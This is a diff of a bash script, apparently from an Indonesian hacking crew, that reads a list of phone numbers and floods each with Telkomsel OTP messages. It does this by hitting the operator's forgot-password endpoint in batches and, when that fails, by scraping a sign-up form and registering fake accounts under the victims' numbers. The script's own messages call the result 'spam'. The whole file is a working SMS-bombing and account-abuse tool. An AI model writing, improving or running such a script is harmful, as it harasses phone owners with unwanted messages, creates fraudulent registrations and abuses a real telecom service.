@@ -1,11 +1,17 @@
 #!/bin/bash
 # FB: fb.me/widhisec | IG : @widhisec | YT : zsecc0de-crew ID
 # ga usah di recode capek w bikin
-function ceklist() 
-{
-	found="NOT FOUND!"
-         if [[ ! -f $asu ]]; then
-         	printf "%s $found\n"
+hitung=10
+if [[ -z $(command -v "curl") ]];then echo "belom dinstall!";fi 
+function heder(){
+              H="Upgrade-Insecure-Requests: 1"
+              D="msisdn=$x"
+              R="https://roli.telkomsel.com/auth/forgot_password"
+}
+function ceklist(){
+	       found="NOT FOUND!"
+         if [[ ! -f $vos ]]; then
+         	printf "%s\n" $found
          	exit 1
          fi
 }
@@ -32,23 +38,34 @@ ${WHITE} ╚███╔███╔╝██║██████╔╝██�
 "
 }
 menu
-function rol()
-{
-	      H="Upgrade-Insecure-Requests: 1"
-              D="msisdn=$x"
-              R="https://roli.telkomsel.com/auth/forgot_password"
+function Requ_Tsel(){
+              r=https://roli.telkomsel.com/home
+              gasz="curl --silent ${r}"
+              greb=$($gasz | grep 'id="signForm"' | gawk -F = '{ print $2 }' | gawk '{ print $1 }' | tr -d '""')
+              vos=$(echo "$greb")
+              crl=$(curl --silent $vos -d "nama=zsecc0de" -d "nohp_reg=$x" -d "gender=m" -d "birth_date=12/2/1999" -d "password=zsec0de12222" -d "repassword=zsec0de12222" |  grep -Po '(?<="message":)[^,]*')
+              if [[ $crl =~ "sorry this msisdn  :$x is already registered" ]]; then
+                  printf "[~] mantav berhasil spam ke $x \n"
+              else
+                  printf "[+] mantav gagal spam ke $x \n"                  
+              fi
 }
-function rol1(){
-              read -p "list here :" asu
-	      ceklist
-              for x in $(cat $asu); do
-              rol
+function Roli_Tsel(){
+              read -p "list here :" vos
+              ceklist
+              for x in $(cat $vos); do
+              ((i=i%hitung)); ((i++==0)) && wait
+              heder "${x}" "${vos}"
               done
-	     c=$(curl -s $R --data $D \
-	     -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
+	          c=$(curl -s $R --data $D \
+	           -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
              -H "Accept-Language: en-US,en;q=0.5" \
              -H "Referer: https://roli.telkomsel.com/auth/forgot_password" \
              -H $H --compressed | grep -Po '(?<="message":)[^,]*')
+             if [[ $c =~ "kode otp berhasil dikirimkan." ]]; then
+                printf "[+] mantav berhasil spam ke $x"
+            else
+                Requ_Tsel
+             fi
 }
-rol1;printf "STATUS:$c \n"
-function agr() { if [[ -z $(command -v "curl") ]];then echo "belom dinstall!";fi }
+Roli_Tsel
